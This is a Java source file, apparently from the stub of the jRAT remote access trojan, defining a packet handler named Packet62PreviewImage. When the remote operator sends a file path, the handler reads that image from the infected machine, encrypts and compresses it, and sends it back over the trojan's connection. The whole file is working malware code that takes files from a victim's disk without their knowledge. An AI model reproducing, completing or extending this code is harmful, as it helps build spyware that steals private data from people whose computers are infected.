package pro.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import pro.jrat.common.compress.GZip;
import pro.jrat.common.crypto.Crypto;
import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;
import pro.jrat.stub.packets.outgoing.Packet43PreviewImage;
import pro.jrat.stub.utils.ImageUtils;

public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		BufferedImage screenShot = ImageIO.read(new File(file));
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));

		Connection.addToSendQueue(new Packet43PreviewImage(buffer.length, screenShot.getWidth(), screenShot.getHeight()));

		Connection.dos.write(buffer);

		Connection.lock();

		System.gc();

	}

}
